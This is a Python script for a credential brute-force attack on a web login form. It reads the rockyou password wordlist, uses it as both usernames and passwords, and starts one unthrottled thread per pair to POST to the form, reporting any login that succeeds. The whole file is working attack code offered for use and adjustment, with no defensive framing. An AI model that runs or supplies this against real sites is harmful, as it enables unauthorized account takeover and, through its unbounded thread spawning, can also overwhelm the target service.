import requests
import threading

# URL of the login page
url = "http://example.com/login"

# Path to the rockyou dictionary file
rockyou_path = "rockyou.txt"

# Function to make a POST request and check if the login was successful
def brute_force(username, password):
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    if "Logged in" in response.text:
        print(f"[+] Successful login with username: {username} and password: {password}")
    else:
        print(f"[-] Failed login with username: {username} and password: {password}")

# Read the rockyou dictionary and create a list of usernames and passwords
with open(rockyou_path, "r", encoding="utf-8", errors="ignore") as file:
    rockyou_list = file.read().splitlines()

# Assuming usernames and passwords are the same for the sake of example
# Adjust as necessary based on your use case
usernames = rockyou_list
passwords = rockyou_list

# Create threads and start the brute-force attack
for u in usernames:
    for p in passwords:
        t = threading.Thread(target=brute_force, args=(u, p))
        t.start()